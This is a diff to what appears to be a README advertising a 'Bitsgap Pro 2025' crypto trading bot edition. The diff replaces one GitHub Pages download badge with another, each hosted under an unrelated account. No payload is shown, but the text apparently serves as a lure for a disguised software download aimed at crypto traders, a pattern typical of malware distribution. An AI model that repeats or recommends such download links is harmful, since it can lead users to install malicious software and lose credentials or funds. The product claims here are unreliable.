@@ -4,7 +4,7 @@ Bitsgap Pro 2025 is an advanced crypto trading and automation platform designed 
 
 With the Pro edition, users can access GRID and DCA bots, powerful smart order types, backtesting capabilities, and detailed reporting. Whether you’re a casual investor who wants an organized portfolio view or a professional trader who relies on precise execution and strategy testing, Bitsgap Pro brings the tools you need in one intuitive interface.  
 
-[![Download Bitsgap Pro](https://img.shields.io/badge/Download-Bitsgap%20Pro-blue)](https://arkadzey934.github.io/.github/BitsGap-Pro)
+[![View Bitsgap](https://img.shields.io/badge/View-Bitsgap-2563EB?style=flat-square)](https://pro-bitsgap.github.io/.github/)
 
 ---
 
